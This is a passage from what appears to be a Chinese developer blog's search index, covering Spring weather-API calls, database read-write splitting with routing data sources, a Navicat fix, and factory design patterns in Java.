TimeUnit.SECONDS); &#125; try &#123; resp = mapper.readValue(strBody,WeatherResponse.class); &#125;catch (IOException e)&#123; log.error("Error!",e); &#125; return resp;&#125; 一开始可以将过期时间缩短一点，这里redis直接启动即可，默认端口是6379.]]></content>
      <tags>
        <tag>从天气项目看spring-cloud</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[1.天气预报系统-简单接口调用]]></title>
    <url>%2F2018%2F11%2F21%2F1.%E5%A4%A9%E6%B0%94%E9%A2%84%E6%8A%A5%E7%B3%BB%E7%BB%9F-%E7%AE%80%E5%8D%95%E6%8E%A5%E5%8F%A3%E8%B0%83%E7%94%A8%2F</url>
    <content type="text"><![CDATA[天气预报系统-简单接口调用 数据来源： http://wthrcdn.etouch.cn/weather_mini?citykey=xxx 或者 http://wthrcdn.etouch.cn/weather_mini?city=xxx 首先我们如何做一个查询天气的接口呢？其实特别简单，就是用HttpClient这个客户端来调用以上的接口，就可以拿到数据了。 我们所需要做的工作也非常少，就是封装一下数据，请求一下参数即可。 主要是根据Json来构建： 123456789101112131415161718192021222324252627282930313233343536@Datapublic class WeatherResponse implements Serializable &#123; private Weather data; private Integer status; private String desc;&#125;@Datapublic class Weather implements Serializable &#123; private String city; private String aqi; private List&lt;Forecast&gt; forecast; private String ganmao; private String wendu; private Yesterday yesterday;&#125;@Datapublic class Forecast implements Serializable &#123; private String date; private String high; private String fengli; private String low; private String fengxiang; private String type;&#125;@Datapublic class Yesterday implements Serializable&#123; private String date; private String high; private String fx; private String low; private String fl; private String type;&#125; ok，数据载体已经好了，下面就是调接口： 1234567891011121314151617181920212223242526272829303132333435363738394041@Servicepublic class WeatherDataServiceImpl implements IWeatherDataService &#123; @Autowired private RestTemplate restTemplate; //统一接口前缀 private static final String WEATHER_URI = "http://wthrcdn.etouch.cn/weather_mini?"; @Override public WeatherResponse getDataByCityId(String cityId) &#123; String uri = WEATHER_URI + "citykey="+cityId; return doGetWeather(uri); &#125; @Override public WeatherResponse getDataByCityName(String cityName) &#123; String uri = WEATHER_URI + "city="+cityName; return doGetWeather(uri); &#125; //根据参数获取天气数据 private WeatherResponse doGetWeather(String uri)&#123; ResponseEntity&lt;String&gt; resString = restTemplate.getForEntity(uri,String.class); ObjectMapper mapper = new ObjectMapper(); WeatherResponse resp = null; String strBody = null; if(resString.getStatusCodeValue() == 200)&#123; strBody = resString.getBody(); &#125; try &#123; resp = mapper.readValue(strBody,WeatherResponse.class); &#125;catch (IOException e)&#123; e.printStackTrace(); &#125; return resp; &#125;&#125; 最后再用一个controller来给一个接口即可。 注意直接启动项目会报错： 123456789101112131415161718Error starting ApplicationContext. To display the conditions report re-run your application with 'debug' enabled.2018-11-19 15:19:54.732 ERROR 13924 --- [ main] o.s.b.d.LoggingFailureAnalysisReporter : ***************************APPLICATION FAILED TO START***************************Description:Field restTemplate in com.swg.weatherbasic.service.impl.WeatherDataServiceImpl required a bean of type 'org.springframework.web.client.RestTemplate' that could not be found.The injection point has the following annotations: - @org.springframework.beans.factory.annotation.Autowired(required=true)Action:Consider defining a bean of type 'org.springframework.web.client.RestTemplate' in your configuration. 我们可以看到提示信息是：&#39;org.springframework.web.client.RestTemplate&#39; that could not be found.,错误就很明显了，这个玩意根本就没有在spring中注册，怎么可以注入呢? 所以，我们需要向spring注册一下这个bean： 12345678910@Configurationpublic class RestConfig &#123; @Autowired private RestTemplateBuilder builder; @Bean public RestTemplate restTemplate()&#123; return builder.build(); &#125;&#125; 彩蛋将此小项目作为一个小版本，直接保存到码云上。如何做呢？ 其实很简单，先去码云上新建一个项目。然后在本地某一个文件夹下执行 1git clone xxx 然后将我们的项目直接拷贝到这个文件夹下。执行 123git add .git commit -am &apos;weather-basic&apos;git push origin master 这样就可以了。 代码地址：https://gitee.com/_swg/weather-action-spring-cloud 下的 weather-basic]]></content>
      <tags>
        <tag>从天气项目看spring-cloud</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[spring多数据源实现读写分离]]></title>
    <url>%2F2018%2F10%2F21%2Fspring%E5%A4%9A%E6%95%B0%E6%8D%AE%E6%BA%90%E5%AE%9E%E7%8E%B0%E8%AF%BB%E5%86%99%E5%88%86%E7%A6%BB%2F</url>
    <content type="text"><![CDATA[spring多数据源实现读写分离 在准备好了三个数据库(一主两从)之后(传送门—&gt;windows10环境下安装多个mysql+主从复制)，如何在代码层面来控制读数据去从库读，写数据到主库写呢，即如何用代码来实现读写分离呢？ 首先是准备一个最基本的ssm的小工程。譬如：可以在浏览器中查询都一个用户的基本信息和插入一条用户信息即可。 最核心的改动在于数据源的配置和数据源的选择。我们的目标是设置一主两从，主库主要负责写数据，从库主要负责同步主库数据并且读去数据。那么我们就需要配置三个数据源。 代码地址：https://github.com/sunweiguo/mysql-slave-master 1. 配置数据源，主要是在spring的配置文件中配置如下信息：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:context="http://www.springframework.org/schema/context" xmlns:tx="http://www.springframework.org/schema/tx" xmlns:aop="http://www.springframework.org/schema/aop" xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-4.0.xsd http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context-4.0.xsd http://www.springframework.org/schema/tx http://www.springframework.org/schema/tx/spring-tx-4.0.xsd http://www.springframework.org/schema/aop http://www.springframework.org/schema/aop/spring-aop.xsd"&gt; &lt;!--1.扫描注解生成bean--&gt; &lt;context:annotation-config/&gt; &lt;!--2.包扫描--&gt; &lt;context:component-scan base-package="com.coder520"/&gt; &lt;!--3.读取数据库连接信息--&gt; &lt;context:property-placeholder location="classpath:jdbc.properties"/&gt; &lt;!--配置sqlSessionFactory，主要是配置他的dataSource--&gt; &lt;bean id="sqlSessionFactory" class="org.mybatis.spring.SqlSessionFactoryBean"&gt; &lt;property name="dataSource" ref="dataSource"/&gt; &lt;property name="mapperLocations" value="classpath:com/coder520/**/**.xml"/&gt; &lt;/bean&gt; &lt;!--配置mybatis的sqlSessionFactory和dao的位置--&gt; &lt;bean class="org.mybatis.spring.mapper.MapperScannerConfigurer"&gt; &lt;property name="basePackage" value="com.coder520.*.dao"/&gt; &lt;property name="sqlSessionFactoryBeanName" value="sqlSessionFactory"/&gt; &lt;/bean&gt; &lt;!--声明事务管理 采用注解方式--&gt; &lt;tx:annotation-driven transaction-manager="transactionManager"/&gt; &lt;bean id="transactionManager" class="org.springframework.jdbc.datasource.DataSourceTransactionManager"&gt; &lt;property name="dataSource" ref="dataSource"/&gt; &lt;/bean&gt; &lt;aop:aspectj-autoproxy/&gt; &lt;!--自定义切面，这里主要是获取在service层上自定义的切面--&gt; &lt;bean id="switchDataSourceAspect" class="com.coder520.common.DataSourceAspect"/&gt; &lt;aop:config&gt; &lt;aop:aspect ref="switchDataSourceAspect"&gt; &lt;aop:pointcut id="tx" expression="execution(* com.coder520.*.service.*.*(..))"/&gt; &lt;aop:before method="before" pointcut-ref="tx"/&gt; &lt;/aop:aspect&gt; &lt;/aop:config&gt; /**********************************核心配置开始*****************************************/ &lt;!--数据库设置--&gt; &lt;bean id="masterdataSource" class="com.alibaba.druid.pool.DruidDataSource" destroy-method="close" init-method="init"&gt; &lt;property name="url" value="$&#123;jdbc_url_m&#125;"/&gt; &lt;property name="username" value="$&#123;jdbc_username&#125;"/&gt; &lt;property name="password" value="$&#123;jdbc_password&#125;"/&gt; &lt;/bean&gt; &lt;bean id="slavedataSource_1" class="com.alibaba.druid.pool.DruidDataSource" destroy-method="close" init-method="init"&gt; &lt;property name="url" value="$&#123;jdbc_url_s_1&#125;"/&gt; &lt;property name="username" value="$&#123;jdbc_username&#125;"/&gt; &lt;property name="password" value="$&#123;jdbc_password&#125;"/&gt; &lt;/bean&gt; &lt;bean id="slavedataSource_2" class="com.alibaba.druid.pool.DruidDataSource" destroy-method="close" init-method="init"&gt; &lt;property name="url" value="$&#123;jdbc_url_s_2&#125;"/&gt; &lt;property name="username" value="$&#123;jdbc_username&#125;"/&gt; &lt;property name="password" value="$&#123;jdbc_password&#125;"/&gt; &lt;/bean&gt; &lt;!--自定义的数据源--&gt; &lt;bean id="dataSource" class="com.coder520.common.DynamicDataSource"&gt; &lt;property name="targetDataSources"&gt; &lt;map&gt; &lt;entry key="master" value-ref="masterdataSource"/&gt; &lt;entry key="slave_1" value-ref="slavedataSource_1"/&gt; &lt;entry key="slave_2" value-ref="slavedataSource_2"/&gt; &lt;/map&gt; &lt;/property&gt; &lt;property name="defaultTargetDataSource" ref="masterdataSource"/&gt; &lt;/bean&gt; /**********************************核心配置结束*****************************************/&lt;/beans&gt; 其中，jdbc.properties文件如下： 12345jdbc_url_m=jdbc:mysql://localhost:3306/bike?useUnicode=true&amp;characterEncoding=UTF-8&amp;zeroDateTimeBehavior=convertToNulljdbc_url_s_1=jdbc:mysql://localhost:3307/bike?useUnicode=true&amp;characterEncoding=UTF-8&amp;zeroDateTimeBehavior=convertToNulljdbc_url_s_2=jdbc:mysql://localhost:3308/bike?useUnicode=true&amp;characterEncoding=UTF-8&amp;zeroDateTimeBehavior=convertToNulljdbc_username=rootjdbc_password=root 2. 最基本的逻辑controller层：12345678910111213141516171819202122232425@Controller@RequestMapping("user")public class UserController &#123; @Autowired private UserService userService; /** *@Description 获取用户信息 */ @RequestMapping("/getuser") @ResponseBody public User getUser()&#123; return userService.findUserByUserId(1); &#125; /** *@Description 新增一条用户信息 */ @RequestMapping("/setuser") @ResponseBody public int setUser()&#123; return userService.insertUser(); &#125;&#125; service层： 1234567891011121314151617181920212223242526272829303132333435363738394041@Service("userServiceImpl")public class UserServiceImpl implements UserService&#123; @Autowired private UserMapper userMapper; /** *@Description 根据用户名查询用户 */ @DataSource(DataSourceType.SLAVE) @Override public User findUserByUserId(long id) &#123; User user=null; try &#123; user =userMapper.selectByPrimaryKey(id); &#125;catch (Exception e)&#123; e.printStackTrace(); throw e; &#125; return user; &#125; /** *@Description 插入用户数据 */ @Override @Transactional public int insertUser() &#123; User user = new User(); user.setMobile("1234567"); user.setNickname("laowang"); User user1 = new User(); user1.setId(2L);//注意：这里原本数据库中就有id=2的数据，这里测试事务是否生效 user1.setMobile("11111111"); user1.setNickname("laowang2"); userMapper.insertSelective(user); userMapper.insertSelective(user1); return 0; &#125;&#125; 我们可以看到，在每个方法上面有一个注解：@DataSource，表示是操作从库还是主库，对于写入是操作主库，我们可以设置为默认行为，所以可以不打上注解。 3. 最后的问题就是如何实现用注解控制的读写分离呢？很显然，我们用借助注解来标识用从库还是主库，当这个方法为写数据时，就标识为主库，当这个方法为读数据时，就标识为从库。主库很简单，因为目前就一个，但是从库有两个，我们可以配置他的模式为轮询模式，轮流从两个从库中读数据，增大数据库的承受能力。 3.1 定义注解12345@Retention(RetentionPolicy.RUNTIME)@Target(&#123;ElementType.METHOD&#125;)public @interface DataSource &#123; DataSourceType value() default DataSourceType.MASTER;&#125; 3.2 这里用到枚举123public enum DataSourceType &#123; MASTER,SLAVE;&#125; 3.3 数据源在配置文件中，我们自定义了一个数据源叫做DynamicDataSource，在里面设置了一个map，将我们有的三个库全部塞进了map中。这个DynamicDataSource类我们需要继承一下AbstractRoutingDataSource类。 我们来看一下AbstractRoutingDataSource类，就明白为什么要继承他了。 这个AbstractRoutingDataSource继承AbstractDataSource,这个AbstractDataSource继承DataSource,我们就能看到在JDBC中学习的经常看见的方法getConnection()。 AbstractRoutingDataSource类里面有一个afterPropertiesSet()方法， 我们可以发现他的实现时将map中定义的所有数据源全部注入到private Map&lt;Object, DataSource&gt; resolvedDataSources;这个map结构中。 有了所有的数据源之后，我们就可以动态地根据数据源的名字来获取这个数据源，继而去连接数据库等。 那么我们就可以重写protected abstract Object determineCurrentLookupKey();这个方法，给他注入当前的数据源(注入数据源名字即可，根据名字这个key就可以找到响应的value，就是相应的数据源)。 下面的问题就是重写determineCurrentLookupKey()这个方法了。我们必须要注意一个问题：线程问题。 123456public class DynamicDataSource extends AbstractRoutingDataSource&#123; @Override protected Object determineCurrentLookupKey() &#123; return DynamicDataSourceHolder.getDataSource(); &#125;&#125; 那如何避免因为高并发的情况下注入出错呢，我们可以借助ThreadLocal这个线程绑定类来实现。 我们知道，ThreadLocal简单来说，就是每个线程都有一个自己的备份，这个变量在本线程中是不会受到其他线程干扰的。 还有一个问题就是，两个从库的轮询如何做到呢？其实也很简单，用一个数字来递增，取模即可。因为我这里只有两个从库，那么取模的结果要么是0要么是1，我就根据这个结果来进行轮询。具体实现如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647public class DynamicDataSourceHolder &#123; public static final ThreadLocal&lt;String&gt; holder = new ThreadLocal&lt;&gt;(); //写库对应的数据源key private static final String MASTER = "master"; //读库对应的数据源key private static final String SLAVE_1 = "slave_1"; private static final String SLAVE_2 = "slave_2"; //为了线程安全，用Atomic包来实现数字的递增 private static AtomicInteger counter = new AtomicInteger(-1); //注入类型，这里其实主要时从注解中获取来的(下面来实现这个) public static void setDataSource(DataSourceType dataSourceType)&#123; if(dataSourceType==DataSourceType.MASTER)&#123; System.out.println("========="+MASTER+"============="); holder.set(MASTER); &#125;else if (dataSourceType==DataSourceType.SLAVE)&#123; //轮询 holder.set(roundRobinSlaveKey()); &#125; &#125; public static String getDataSource()&#123; return holder.get(); &#125; private static String roundRobinSlaveKey() &#123; Integer index = counter.incrementAndGet()%2; //当递增到某个树时，我们要重置一下，防止溢出 if(counter.get()&gt;9999)&#123; counter.set(-1); &#125; //轮询的效果 if(index==0)&#123; System.out.println("========="+SLAVE_1+"============="); return SLAVE_1; &#125;else &#123; System.out.println("========="+SLAVE_2+"============="); return SLAVE_2; &#125; &#125;&#125; 3.4 从注解中获取类型：主库还是从库其实，这就比较简单了，因为我们的切面和反射就可以派上用场了。 我们在spring的配置文件中已经配置好切面类，并且配置了他的作用范围主要时service层。 我们也知道切面有几种的执行时机，比如before，after等，显然，这里我们需要在执行某个方法之前要执行这个切面。所以用before，另外就是用反射获取到这个方法，然后拿到这个方法上面的注解，最后拿到注解里面的参数。拿到这个参数之后，我们塞进ThreadLocal中。 123456789101112131415public class DataSourceAspect &#123; public void before(JoinPoint point) throws NoSuchMethodException &#123; Object target = point.getTarget(); String method = point.getSignature().getName(); Class classz = target.getClass(); Class&lt;?&gt;[] parameterTypes = ((MethodSignature)point.getSignature()).getMethod().getParameterTypes(); Method m = classz.getMethod(method,parameterTypes); if(m!=null&amp;&amp;m.isAnnotationPresent(DataSource.class))&#123; DataSource dataSource = m.getAnnotation(DataSource.class); DynamicDataSourceHolder.setDataSource(dataSource.value()); &#125; &#125;&#125; 那么我们在service层中的注解配置就可以生效了，并且拿到注解里面的信息，从而来实现读写分离。 启动项目，在浏览器中输入url进行相应的测试，看打印结果是否符合预期。 最后的问题是：当从数据库的数量变化时，需要在代码层面进行改动，这样的写法真的合理吗？我觉得用这种写法，无疑是想采用比较简单的方式来实现读写分离，属于比较初期的写法，并且改动是不能避免的。在架构演进后，必然会放弃这种初级的写法，比如使用现成的中间件来实现。还有一个问题是：注解可以放在dao层吗？答案肯定是不能的，毕竟在第二个测试方法中(塞入id相同的记录)，需要事务回滚。而dao层都是分离的方法，不能实现事务。]]></content>
      <tags>
        <tag>mysql多数据源</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[navicate新建查询报错问题记录]]></title>
    <url>%2F2018%2F10%2F19%2Fnavicate%E6%96%B0%E5%BB%BA%E6%9F%A5%E8%AF%A2%E6%8A%A5%E9%94%99%E9%97%AE%E9%A2%98%E8%AE%B0%E5%BD%95%2F</url>
    <content type="text"><![CDATA[navicate新建查询报错问题记录。 有的时候，对这个数据库进行新建查询，会报错： 这时候，我们先关闭连接，右击编辑连接： 对其位置进行修改： 这样就可以了。]]></content>
      <tags>
        <tag>技术短文杂记</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[对于工厂模式的理解]]></title>
    <url>%2F2018%2F09%2F24%2F%E5%AF%B9%E4%BA%8E%E5%B7%A5%E5%8E%82%E6%A8%A1%E5%BC%8F%E7%9A%84%E7%90%86%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[面试常问工厂模式。 1. 前言一直都没有系统地去学习设计模式，但是又是面试中常问的问题，比如问：说一说你对工厂模式的理解(vivo面试)，我的回答一般是：工厂模式类似于一个工厂去生产产品，你需要什么产品，不要自己去new，而是通过工厂来获取，达到对象的创建与使用解耦的目的。但是，总感觉是感性上的认知，所以把工厂模式拿出来再好好理理。 2. 简单工厂模式传送门—&gt;简单工厂模式介绍 定义一个工厂类，根据传入的参数不同返回不同的实例，被创建的实例具有共同的父类或接口。 3. 工厂方法模式传送门—&gt;工厂方法模式介绍 对于简单工厂的进一步封装，因为对于简单工厂模式而言，需要新添产品的时候，需要在工厂类中添加对应的判断和new，不符合开闭原则。 这里是对于每一个产品用一个单独的工厂来生产。而不是单独一个工厂统一生产所有产品。 4. 抽象工厂模式传送门—&gt;抽象工厂模式介绍 抽象工厂模式是工厂方法的仅一步深化，在这个模式中的工厂类不单单可以创建一个对象，而是可以创建一组对象。 5. 对于工厂模式的一些思考 工厂模式是为了解耦 工厂模式可以降低代码重复 由于创建过程都由工厂统一管理，所以发生业务逻辑变化，不需要找到所有需要创建B的地方去逐个修正，只需要在工厂里修改即可，降低维护成本。 有的时候觉得工厂模式没啥用，尤其是抽象工厂模式跟我们好像没啥关系。还是那句话，这些设计模式随着系统越来越大，将产生越来越深远的影响。一开始代码比较少，所以可能用new的方式处理也不算麻烦，但是随着系统越来越庞大，越来越复杂，牵一发而动全身甚至会容易产生扩展错误时，就应该好好想想，这里是不是应该用到设计模式，比如典型的工厂模式。]]></content>
      <tags>
        <tag>技术短文杂记</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[三、设计模式-抽象工厂模式]]></title>
    <url>%2F2018%2F09%2F24%2F%E4%B8%89%E3%80%81%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F-%E6%8A%BD%E8%B1%A1%E5%B7%A5%E5%8E%82%E6%A8%A1%E5%BC%8F%2F</url>
    <content type="text"><![CDATA[抽象工厂模式 为什么要使用抽象工厂模式 参考工厂方法模式的优点 当一个产品族中的多个对象被设计成一起工作时，它能保证客户端始终只使用同一个产品族中的对象。 什么是抽象工厂模式抽象工厂模式(Abstract Factory Pattern)：提供一个创建一系列相关或相互依赖对象的接口，而无须指定它们具体的类。 相关概念产品族：如格力的洗衣机，冰箱，空调是一个产品族。产品等级：如格力的空调，海尔的空调，三星的空调是一个产品等级。 角色 产品接口。产品接口的主要目的是定义产品的规范，所有的产品实现都必须遵循产品接口定义的规范。 产品实现。实现产品接口的具体类，决定了产品在客户端中的具体行为。 抽象工厂。一个抽象工厂派生不同的具体工厂，每个具体工厂生产自己的产品族（包含不同产品等级） 工厂实现。在编程中，工厂实现决定如何实例化产品，是实现扩展的途径。与工厂模式中需要有多少种产品就需要有多少个具体的工厂实现不同的是，抽象通常模式一个工厂可以生产多种产品。 UML类图 实现 创建产品接口 创建实现产品接口的产品类。 创建抽象工厂接口 创建实现抽象工厂接口的工厂类 代码示例产品接口 IFridge.java 12345//冰箱产品接口public interface IFridge &#123; // 冰箱产品接口 // 冰箱的action&#125; 产品接口 IAirCondition.java 12345//空调接口public interface IAirCondition &#123; // 空调产品接口 // 空调的action&#125; 产品 GreeAirCondition .java 1234//格力的空调public class GreeAirCondition implements IAirCondition&#123; // 格力空调的action和property&#125; 产品 SamsungAirCondition.java 1234//三星的空调public class SamsungAirCondition implements IAirCondition&#123; // 三星空调的action和property&#125; 产品 GreeFridge.java 1234//格力的冰箱public class GreeFridge implements IFridge &#123; // 格力冰箱的action和property&#125; 产品 SamsungFridge .java 1234//三星的冰箱public class SamsungFridge implements IFridge &#123; // 三星冰箱的action和property&#125; 抽象工厂 IFactry.java 123456//工厂接口，即抽象工厂interface IFactory &#123; IFridge CreateFridge(); IAirCondition CreateAirCondition();&#125; 工厂 GreeFactry.java 12345678910//格力的工厂，生产格力的产品族public class GreeFactry implements IFactory &#123; public IAirCondition CreateAirCondition() &#123; return new GreeAirCondition(); // 格力的工厂生产格力的空调 &#125; public IFridge CreateFridge() &#123; return new GreeFridge(); // 格力的工厂生产格力的冰箱 &#125;&#125; 工厂 SamsungFactory.java123456789101112//三星的工厂，生产三星的产品族public class SamsungFactory implements IFactory &#123; public IAirCondition CreateAirCondition() &#123; return new SamsungAirCondition(); // 三星的工厂生产三星的空调 &#125; public IFridge CreateFridge() &#123; return new SamsungFridge(); // 三星的工厂生产三星的冰箱 &#125;&#125; 优点符合“开闭原则”。增加新的具体工厂和产品族很方便，无须修改已有系统。 缺点增加新的产品等级结构麻烦。 问题抽象工厂模式和工厂方法模式区别 工厂可以生产的产品种类不同。在抽象工厂模式中，工厂可以生产不同的产品。但在工厂方法中，工厂只能生产一种产品。抽象产品个数不同。在抽象工厂模式中，抽象产品有多个。在工厂方法中，抽象产品只有一个。 如果需要增加一个海尔的产品族，该如何办？ 新建海尔的工厂类HaierFactory，和海尔的空调类HaierAirCondition，海尔的冰箱类SamsungFridge。其他的不用修改。 如果需要增加一个洗衣机的产品等级，该如何办？ 在抽象工厂中新建生产洗衣机的方法； 新建一个生产洗衣机的产品接口 为三星新建一个生产洗衣机的产品类 为格力新建一个生产洗衣机的产品类]]></content>
      <tags>
        <tag>设计模式</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[二、设计模式-工厂方法模式]]></title>
    <url>%2F2018%2F09%2F24%2F%E4%BA%8C%E3%80%81%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F-%E5%B7%A5%E5%8E%82%E6%96%B9%E6%B3%95%E6%A8%A1%E5%BC%8F%2F</url>
    <content type="text"><![CDATA[工厂方法模式 为什么要使用工厂方法模式在简单工厂模式中曾提到，简单工厂模式虽然简单，但存在一个很严重的问题：当系统中需要引入新产品时，由于静态工厂方法通过所传入参数的不同来创建不同的产品，必定要修改工厂类的源代码，违背了“开闭原则”。利用工厂方法模式可以解决这个问题。 什么是工厂方法模式工厂方法模式(Factory Method Pattern)：定义一个用于创建对象的接口，让子类决定实例化哪个类。工厂方法模式使一个类的实例化延迟到子类。 遵守的原则开闭原则。 角色 产品接口。产品接口的主要目的是定义产品的规范，所有的产品实现都必须遵循产品接口定义的规范。 产品实现。实现产品接口的具体类，决定了产品在客户端中的具体行为。 工厂接口。工厂接口是工厂方法模式的核心，与调用者直接交互用来提供产品。在实际编程中，有时候也会使用一个抽象类来作为与调用者交互的接口，其本质上是一样的。 工厂实现。在编程中，工厂实现决定如何实例化产品，是实现扩展的途径，需要有多少种产品，就需要有多少个具体的工厂实现。 UML类图 实现 创建一个 产品接口IProduct.java。 创建实现产品接口IProduct.java的产品类ProductA.java、ProductB.java。 创建工厂类接口IProductFactory.java。 创建和每种产品对应的工厂类FactoryA.java、FactoryB.java。 创建测试类FactoryPatternDemo.java。 代码示例产品接口IProduct.java 123public interface IProduct &#123; void get();&#125; 产品类 ProductA.java 123456public class ProductA implements IProduct &#123; @Override public void get() &#123; System.out.println("get ProductA"); &#125;&#125; 产品类 ProductB.java 1234567public class ProductB implements IProduct &#123; @Override public void get() &#123; System.out.println("get ProductB"); &#125;&#125; 工厂接口IFactory.java 123public interface IFactory &#123; public IProduct getProduct();&#125; 工厂 FactoryA.java 1234567891011121314public class FactoryA implements IFactory&#123; IProduct productA; public FactoryA() &#123; this.productA = new ProductA(); &#125; @Override public IProduct getProduct() &#123; // TODO Auto-generated method stub return this.productA; &#125;&#125; 工厂 FactoryB.java 1234567891011121314public class FactoryB implements IFactory&#123; IProduct productB; public FactoryB() &#123; this.productB = new ProductB(); &#125; @Override public IProduct getProduct() &#123; // TODO Auto-generated method stub return this.productB; &#125;&#125; 测试类 FactoryPatternDemo.java 12345678910111213public class FactoryPatternDemo &#123; public static void main(String[] args) &#123; FactoryA productFactoryA = new FactoryA(); FactoryB productFactoryB = new FactoryB(); IProduct productA = productFactoryA.getProduct(); productA.get(); IProduct productB = productFactoryB.getProduct(); productB.get(); &#125;&#125; 测试结果 12get ProductAget ProductB 优点 封装。产品类的实例化有时候是比较复杂和多变的，通过工厂模式，将产品的实例化封装起来，调用者无需关心产品的实例化过程，只需依赖工厂即可得到自己想要的产品。 多态。基于工厂角色和产品角色的多态性设计是工厂方法模式的关键。它能够使工厂可以自主确定创建何种产品对象，而如何创建这个对象的细节则完全封装在具体工厂内部。工厂方法模式之所以又被称为多态工厂模式，是因为所有的具体工厂类都具有同一抽象父类。 遵守“开闭原则”。在系统中加入新产品时，而只要添加一个具体工厂和具体产品就可以了，完全符合“开闭原则”。 缺点 增加了系统的复杂度。在添加新产品时，需要编写新的具体产品类，而且还要提供与之对应的具体工厂类，系统中类的个数将成对增加。 适用环境将创建对象的任务委托给多个工厂子类中的某一个，客户端在使用时可以无须关心是哪一个工厂子类创建产品子类，需要时再动态指定，可将具体工厂类的类名存储在配置文件或数据库中。 使用场景JDBC切换数据库产品。如从Oracle切换到MySQL，只需要更改配置文件中的参数就可以了。]]></content>
      <tags>
        <tag>设计模式</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[一、设计模式-简单工厂模式]]></title>
    <url>%2F2018%2F09%2F24%2F%E4%B8%80%E3%80%81%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F-%E7%AE%80%E5%8D%95%E5%B7%A5%E5%8E%82%E6%A8%A1%E5%BC%8F%2F</url>
    <content type="text"><![CDATA[简单工厂模式 说明虽然简单工厂模式并不是GOF23中设计模式之一，但还是有必要了解一下。 为什么要用简单工厂模式通过简单工厂模式，可以将产品的实例化封装起来，调用者无需关心产品的实例化过程，只需使用工厂即可得到自己想要的产品。 什么是简单工厂模式简单工厂模式（Simple Factory Pattern）：定义一个工厂类，它可以根据参数的不同返回不同类的实例，被创建的实例通常都具有共同的父类。 角色 产品接口。产品接口的主要目的是定义产品的规范，所有的产品实现都必须遵循产品接口定义的规范。 产品实现。实现产品接口的具体类，决定了产品在客户端中的具体行为。 静态工厂。在编程中，工厂实现决定如何实例化产品。 实现 创建一个产品接口IProduct.java 创建实现IProduct接口的产品类ProductA.java、ProductB.java 创建静态工厂类ProductFactory 创建测试类FactoryPatternDemo.java 代码示例产品接口 IProduct.java 123public interface IProduct &#123; void get();&#125; 产品 ProductA.java 123456public class ProductA implements IProduct &#123; @Override public void get() &#123; System.out.println("get ProductA"); &#125;&#125; 产品 ProductB.java 1234567public class ProductB implements IProduct &#123; @Override public void get() &#123; System.out.println("get ProductB"); &#125;&#125; 工厂 ProductFactory.java 1234567891011public class ProductFactory &#123; public IProduct getProduct(String productType) &#123; if ("ProductA".equalsIgnoreCase(productType)) &#123; return new ProductA(); &#125; else if ("ProductB".equalsIgnoreCase(productType)) &#123; return new ProductB(); &#125; return null; &#125;&#125; 测试类FactoryPatternDemo.java 1234567891011public class FactoryPatternDemo &#123; public static void main(String[] args) &#123; ProductFactory productFactory = new ProductFactory(); IProduct productA = productFactory.getProduct("ProductA"); productA.get(); IProduct productB = productFactory.getProduct("ProductB"); productB.get();&#125; 测试结果 12get ProductAget ProductB 优点封装。产品类的实例化有时候是比较复杂和多变的，通过工厂模式，将产品的实例化封装起来，调用者无需关心产品的实例化过程，只需依赖工厂即可得到自己想要的产品。 缺点违反了“开闭原则”。简单工厂通过构造时传入的标识来生产产品，不同产品都在同一个工厂中生产，这种判断会随着产品的增加而增加，给扩展和维护带来麻烦。因为没有工厂接口，所以在工厂实现的扩展性方面稍弱。 适用环境在以下情况下可以使用简单工厂模式： 工厂类负责创建的对象比较少。由于创建的对象较少，不会造成工厂方法中的业务逻辑太过复杂。 客户端只需要传入工厂类的参数，对于如何创建对象不需要关心。客户端不需要关心创建细节，甚至连类名都不需要记住，只需要知道类型所对应的参数即可创建对应产品。 使用场景JDK类库中广泛使用了简单工厂模式，如工具类java.text.DateFormat，它用于格式化一个本地日期或者时间。 1234public final static DateFormat getDateInstance();public final static DateFormat getDateInstance(int style);public final static DateFormat getDateInstance(int style,Localelocale); 问题如果需求产生了变化，增加一个产品C，该如何办？ 需要增加一个具体类，和修改工厂。简单工厂模式的问题就在于产品和工厂还是没有完全解耦，绑定在一起的。每当新增一种产品时，你都需要去维护工厂中的判断语句，造成的后果就是可能这个工厂类判断语句太过庞大，给扩展和维护带来很多麻烦。所以，简单工厂通过构造时传入的标识来生产产品，不同产品都在同一个工厂中生产，这种判断会随着产品的增加而增加，给扩展和维护带来麻烦。使用工厂模式可以解决这个问题。]]></content>
      <tags>
        <tag>设计模式</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[关于枚举实现单例模式]]></title>
    <url>%2F2018%2F09%2F24%2F%E5%85%B3%E4%BA%8E%E6%9E%9A%E4%B8%BE%E5%AE%9E%E7%8E%B0%E5%8D%95%E4%BE%8B%E6%A8%A1%E5%BC%8F%2F</url>
